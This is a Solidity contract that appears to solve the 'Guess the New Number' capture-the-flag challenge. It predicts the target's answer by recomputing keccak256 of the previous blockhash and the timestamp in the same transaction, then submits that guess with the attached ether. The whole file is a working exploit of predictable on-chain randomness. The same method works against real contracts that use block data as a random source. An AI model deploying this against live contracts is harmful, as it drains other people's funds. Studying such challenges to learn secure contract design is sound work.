// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
    function isComplete() external;
}
contract GuessTheNewNumberAttack {
    IGuessTheNewNumberChallenge challenge;
    constructor(address _challenge) {
        challenge = IGuessTheNewNumberChallenge(_challenge);
    }

    function attack() external payable {
        uint8 n = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        challenge.guess{value: msg.value}(n);
    }
    receive() external payable {}
}